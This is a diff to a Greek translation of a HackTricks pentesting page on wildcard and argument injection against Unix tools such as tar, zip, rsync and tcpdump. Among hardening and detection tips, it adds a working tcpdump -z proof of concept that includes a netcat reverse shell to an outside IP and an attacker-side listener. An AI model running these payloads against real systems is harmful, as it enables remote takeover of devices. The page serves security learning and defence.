@@ -2,8 +2,8 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> Wildcard (aka *glob*) **εισαγωγή επιχειρημάτων** συμβαίνει όταν ένα προνομιακό σενάριο εκτελεί ένα Unix δυαδικό όπως `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα μη παραquoted wildcard όπως `*`.
-> Δεδομένου ότι το shell επεκτείνει το wildcard **πριν** εκτελέσει το δυαδικό, ένας επιτιθέμενος που μπορεί να δημιουργήσει αρχεία στον τρέχοντα κατάλογο μπορεί να κατασκευάσει ονόματα αρχείων που αρχίζουν με `-` ώστε να ερμηνεύονται ως **επιλογές αντί για δεδομένα**, αποτελεσματικά λαθραία σημαίες ή ακόμα και εντολές.
+> Η **έγχυση επιχειρημάτων** με wildcard (γνωστό και ως *glob*) συμβαίνει όταν ένα προνομιακό σενάριο εκτελεί ένα Unix binary όπως `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα μη παραquoted wildcard όπως `*`.
+> Δεδομένου ότι το shell επεκτείνει το wildcard **πριν** εκτελέσει το binary, ένας επιτιθέμενος που μπορεί να δημιουργήσει αρχεία στον τρέχοντα κατάλογο μπορεί να κατασκευάσει ονόματα αρχείων που αρχίζουν με `-`, έτσι ώστε να ερμηνεύονται ως **επιλογές αντί για δεδομένα**, αποτελεσματικά λαθραία σημαίες ή ακόμα και εντολές.
 > Αυτή η σελίδα συγκεντρώνει τις πιο χρήσιμες πρωτογενείς μεθόδους, πρόσφατες έρευνες και σύγχρονες ανιχνεύσεις για το 2023-2025.
 
 ## chown / chmod
@@ -41,7 +41,7 @@ touch "--checkpoint-action=exec=sh shell.sh"
 
 ### bsdtar / macOS 14+
 
-Ο προεπιλεγμένος `tar` σε πρόσφατο macOS (βασισμένος σε `libarchive`) *δεν* υλοποιεί το `--checkpoint`, αλλά μπορείτε να επιτύχετε εκτέλεση κώδικα με την επιλογή **--use-compress-program** που σας επιτρέπει να καθορίσετε έναν εξωτερικό συμπιεστή.
+Ο προεπιλεγμένος `tar` σε πρόσφατες εκδόσεις macOS (βασισμένος σε `libarchive`) *δεν* υλοποιεί το `--checkpoint`, αλλά μπορείτε να επιτύχετε εκτέλεση κώδικα με την επιλογή **--use-compress-program** που σας επιτρέπει να καθορίσετε έναν εξωτερικό συμπιεστή.
 ```bash
 # macOS example
 touch "--use-compress-program=/bin/sh"
@@ -86,38 +86,83 @@ touch @root.txt                  # tells 7z to use root.txt as file list
 ```bash
 zip result.zip files -T --unzip-command "sh -c id"
 ```
-Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.
+Εισάγετε τη σημαία μέσω ενός κατασκευασμένου ονόματος αρχείου και περιμένετε να καλέσει το σενάριο δημιουργίας αντιγράφων ασφαλείας με δικαιώματα `zip -T` (δοκιμή αρχείου) στο προκύπτον αρχείο.
 
 ---
 
-## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)
+## Πρόσθετα δυαδικά αρχεία ευάλωτα σε ένεση wildcard (γρήγορη λίστα 2023-2025)
 
-The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:
+Οι παρακάτω εντολές έχουν κακοποιηθεί σε σύγχρονες CTF και πραγματικά περιβάλλοντα. Το payload δημιουργείται πάντα ως *όνομα αρχείου* μέσα σε έναν εγγράψιμο φάκελο που θα επεξεργαστεί αργότερα με wildcard:
 
-| Binary | Flag to abuse | Effect |
+| Δυαδικό | Σημαία προς κακοποίηση | Επίδραση |
 | --- | --- | --- |
-| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Διαβάστε το περιεχόμενο του αρχείου |
+| `bsdtar` | `--newer-mtime=@<epoch>` → αυθαίρετο `@file` | Ανάγνωση περιεχομένων αρχείου |
 | `flock` | `-c <cmd>` | Εκτέλεση εντολής |
-| `git`   | `-c core.sshCommand=<cmd>` | Εκτέλεση εντολής μέσω git over SSH |
+| `git`   | `-c core.sshCommand=<cmd>` | Εκτέλεση εντολής μέσω git μέσω SSH |
 | `scp`   | `-S <cmd>` | Δημιουργία αυθαίρετου προγράμματος αντί για ssh |
 
-These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.
+Αυτές οι πρωτογενείς εντολές είναι λιγότερο κοινές από τις κλασικές *tar/rsync/zip* αλλά αξίζει να ελεγχθούν κατά την αναζήτηση.
 
 ---
 
-## Detection & Hardening
+## tcpdump rotation hooks (-G/-W/-z): RCE μέσω ένεσης argv σε wrappers
 
-1. **Disable shell globbing** in critical scripts: `set -f` (`set -o noglob`) prevents wildcard expansion.
-2. **Quote or escape** arguments: `tar -czf "$dst" -- *` is *not* safe — prefer `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
-3. **Explicit paths**: Use `/var/www/html/*.log` instead of `*` so attackers cannot create sibling files that start with `-`.
-4. **Least privilege**: Run backup/maintenance jobs as an unprivileged service account instead of root whenever possible.
-5. **Monitoring**: Elastic’s pre-built rule *Potential Shell via Wildcard Injection* looks for `tar --checkpoint=*`, `rsync -e*`, or `zip --unzip-command` immediately followed by a shell child process. The EQL query can be adapted for other EDRs.
+Όταν ένα περιορισμένο shell ή wrapper προμηθευτή κατασκευάζει μια γραμμή εντολών `tcpdump` συνδυάζοντας πεδία που ελέγχονται από τον χρήστη (π.χ., μια παράμετρος "όνομα αρχείου") χωρίς αυστηρή απόσπαση/επικύρωση, μπορείτε να λαθρέψετε επιπλέον σημαίες `tcpdump`. Ο συνδυασμός `-G` (χρονική περιστροφή), `-W` (περιορισμός αριθμού αρχείων) και `-z <cmd>` (εντολή μετά την περιστροφή) αποφέρει αυθαίρετη εκτέλεση εντολών ως ο χρήστης που εκτελεί το tcpdump (συχνά root σε συσκευές).
+
+Προϋποθέσεις:
+
+- Μπορείτε να επηρεάσετε το `argv` που περνάει στο `tcpdump` (π.χ., μέσω ενός wrapper όπως `/debug/tcpdump --filter=... --file-name=<HERE>`).
+- Ο wrapper δεν απολυμαίνει κενά ή tokens που ξεκινούν με `-` στο πεδίο ονόματος αρχείου.
+
+Κλασικό PoC (εκτελεί ένα σενάριο αντίστροφης σύνδεσης από μια εγγράψιμη διαδρομή):
+```sh
+# Reverse shell payload saved on the device (e.g., USB, tmpfs)
+cat > /mnt/disk1_1/rce.sh <<'EOF'
+#!/bin/sh
+rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
+EOF
+chmod +x /mnt/disk1_1/rce.sh
+
+# Inject additional tcpdump flags via the unsafe "file name" field
+/debug/tcpdump --filter="udp port 1234" \
+--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"
+
+# On the attacker host
+nc -6 -lvnp 4444 &
+# Then send any packet that matches the BPF to force a rotation
+printf x | nc -u -6 [victim_ipv6] 1234
+```
+Λεπτομέρειες:
+
+- `-G 1 -W 1` αναγκάζει μια άμεση περιστροφή μετά το πρώτο πακέτο που ταιριάζει.
+- `-z <cmd>` εκτελεί την εντολή μετά την περιστροφή μία φορά ανά περιστροφή. Πολλές εκδόσεις εκτελούν `<cmd> <savefile>`. Αν το `<cmd>` είναι ένα σενάριο/διερμηνέας, βεβαιωθείτε ότι η διαχείριση των παραμέτρων ταιριάζει με το payload σας.
+
+Μη-αφαιρούμενα μέσα παραλλαγές:
+
+- Αν έχετε οποιαδήποτε άλλη πρωτόγονη μέθοδο για να γράψετε αρχεία (π.χ., μια ξεχωριστή εντολή περιτύλιξης που επιτρέπει την ανακατεύθυνση εξόδου), τοποθετήστε το σενάριό σας σε μια γνωστή διαδρομή και ενεργοποιήστε `-z /bin/sh /path/script.sh` ή `-z /path/script.sh` ανάλογα με τη σημασία της πλατφόρμας.
+- Ορισμένα περιτυλίγματα προμηθευτών περιστρέφονται σε θέσεις ελέγχου που ελέγχονται από τον επιτιθέμενο. Αν μπορείτε να επηρεάσετε τη διαδρομή περιστροφής (symlink/διαδρομή καταλόγου), μπορείτε να κατευθύνετε το `-z` να εκτελέσει περιεχόμενο που ελέγχετε πλήρως χωρίς εξωτερικά μέσα.
+
+Συμβουλές σκληρύνσης για προμηθευτές:
+
+- Ποτέ μην περνάτε συμβολοσειρές που ελέγχονται από τον χρήστη απευθείας στο `tcpdump` (ή οποιοδήποτε εργαλείο) χωρίς αυστηρές λίστες επιτρεπόμενων. Παραθέστε και επικυρώστε.
+- Μην εκθέτετε τη λειτουργία `-z` σε περιτυλίγματα; εκτελέστε το tcpdump με ένα σταθερό ασφαλές πρότυπο και απαγορεύστε εντελώς επιπλέον σημαίες.
+- Αφαιρέστε τα προνόμια του tcpdump (cap_net_admin/cap_net_raw μόνο) ή εκτελέστε το κάτω από έναν αφιερωμένο μη προνομιούχο χρήστη με περιορισμούς AppArmor/SELinux.
+
+## Ανίχνευση & Σκληρύνση
+
+1. **Απενεργοποιήστε την επέκταση wildcard** σε κρίσιμα σενάρια: `set -f` (`set -o noglob`) αποτρέπει την επέκταση wildcard.
+2. **Παραθέστε ή διαφύγετε** παραμέτρους: `tar -czf "$dst" -- *` *δεν είναι* ασφαλές — προτιμήστε `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
+3. **Ρητές διαδρομές**: Χρησιμοποιήστε `/var/www/html/*.log` αντί για `*` ώστε οι επιτιθέμενοι να μην μπορούν να δημιουργήσουν αδελφά αρχεία που ξεκινούν με `-`.
+4. **Ελάχιστο προνόμιο**: Εκτελέστε εργασίες αντιγράφων ασφαλείας/συντήρησης ως μη προνομιούχος υπηρεσία αντί για root όποτε είναι δυνατόν.
+5. **Παρακολούθηση**: Ο προ-κατασκευασμένος κανόνας της Elastic *Potential Shell via Wildcard Injection* αναζητά `tar --checkpoint=*`, `rsync -e*`, ή `zip --unzip-command` αμέσως ακολουθούμενο από μια διαδικασία παιδιού shell. Το EQL query μπορεί να προσαρμοστεί για άλλες EDRs.
 
 ---
 
-## References
+## Αναφορές
 
-* Elastic Security – Potential Shell via Wildcard Injection Detected rule (last updated 2025)
-* Rutger Flohil – “macOS — Tar wildcard injection” (Dec 18 2024)
+* Elastic Security – Potential Shell via Wildcard Injection Detected rule (τελευταία ενημέρωση 2025)
+* Rutger Flohil – “macOS — Tar wildcard injection” (18 Δεκ 2024)
+* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
+* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
 
 {{#include ../../banners/hacktricks-training.md}}
